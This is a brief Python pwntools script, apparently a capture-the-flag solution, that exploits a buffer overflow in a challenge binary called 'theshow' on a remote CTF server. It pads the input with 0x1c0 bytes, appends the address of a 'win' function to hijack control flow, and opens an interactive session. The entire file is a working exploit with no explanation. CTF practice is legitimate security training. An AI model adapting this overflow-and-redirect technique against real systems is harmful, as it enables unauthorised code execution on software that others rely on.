from pwn import *

# p = process('./theshow')
p = remote('0.cloud.chals.io', 30138)
e = ELF('./theshow')

payload = b'A'*0x1c0
payload += p64(e.symbols['win'])

p.sendline(b'A')
p.sendline(b'80')
p.sendline(payload)
p.sendline(b'1')
p.interactive()
